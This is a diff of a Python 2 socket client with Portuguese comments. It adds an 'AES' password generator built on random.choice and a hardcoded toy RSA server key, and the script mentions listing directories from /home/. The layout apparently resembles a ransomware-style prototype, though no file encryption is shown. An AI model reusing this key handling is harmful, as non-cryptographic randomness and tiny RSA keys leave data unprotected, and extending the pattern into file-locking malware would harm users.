@@ -5,9 +5,10 @@
 
 #from AES.crypt import *
 import os
-import crypt
+import socket
+from random import choice
 
-import socket, random
+from gera_chaves_RSA import *
 
 
 # listar diretorios a partir do /home/
@@ -74,8 +75,19 @@ def client(IP_serv):
     socket_obj.send(mensagem)
     #data = socket_obj.recv(1024) # recebeu do servidor a chave publica
 
+def gera_chave_AES():
+    tamanho=30
+    caracters = '0123456789abcdefghijlmnopqrstuwvxz-/*&#@!=-.,'
+    senha = ''
+    for char in xrange(tamanho):
+            senha += choice(caracters)
+    return senha
+
+
 
 if __name__=="__main__":
-    print('tentando conectar ao server .... ')
-    #menu()
-    client('127.0.0.1')
+    # Chave pública do servidor
+    serv_RSA=[1121,655]
+    # gera a senha AES
+    senha_AES=gera_chave_AES()
+    # gera a senha RSA
